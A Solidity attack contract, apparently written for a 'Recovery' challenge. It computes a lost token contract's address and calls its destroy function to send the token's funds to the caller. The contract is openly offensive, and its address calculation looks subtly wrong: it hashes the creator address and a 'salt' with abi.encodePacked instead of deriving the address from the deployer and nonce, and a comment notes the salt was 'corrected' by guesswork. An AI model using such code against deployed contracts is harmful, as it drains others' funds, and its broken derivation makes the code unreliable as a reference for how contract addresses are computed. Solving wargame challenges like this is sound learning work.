pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryAttacker0 {
    address public recoveryInstance;
    uint256 private salt = 0; // corrected salt to 0

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function computeTokenAddress() public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(recoveryInstance, salt));
        return address(uint160(uint256(hash)));
    }

    function attack() external {
        address token = computeTokenAddress();
        ISimpleToken(token).destroy(payable(msg.sender));
    }
}